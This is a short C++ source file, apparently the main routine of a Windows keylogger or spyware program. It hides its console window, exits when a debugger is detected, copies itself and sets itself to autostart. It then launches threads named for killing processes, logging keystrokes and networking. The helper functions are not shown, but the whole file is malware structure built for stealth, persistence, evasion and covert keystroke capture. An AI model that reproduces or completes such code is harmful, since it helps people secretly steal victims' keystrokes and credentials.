// #define UNICODE
#include <Windows.h>

#ifndef _BEHAVE_HPP_
#define _BEHAVE_HPP_
#include "behave.hpp"
#endif

#ifndef _KEYWORDS_HPP_
#define _KEYWORD_HPP_
#include "keywords.hpp"
#endif

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
#ifndef REPORTER_DEBUG_MODE
    ShowWindow(GetConsoleWindow(), SW_HIDE);
#endif
    if (IsDebuggerPresent())
    {
        return -1;
    }

    std::string p = cpSelf();
    if (p != "")
    {
        autoStart(p);
    }

    HANDLE behaves[BEHAVES_COUNT];
    behaves[0] = killingProcess();
    behaves[1] = startKeyLogging();
    behaves[2] = startNetworking();

    DWORD ret = WaitForMultipleObjects(BEHAVES_COUNT, behaves, TRUE, INFINITE);

    system("pause");
    return 0;
}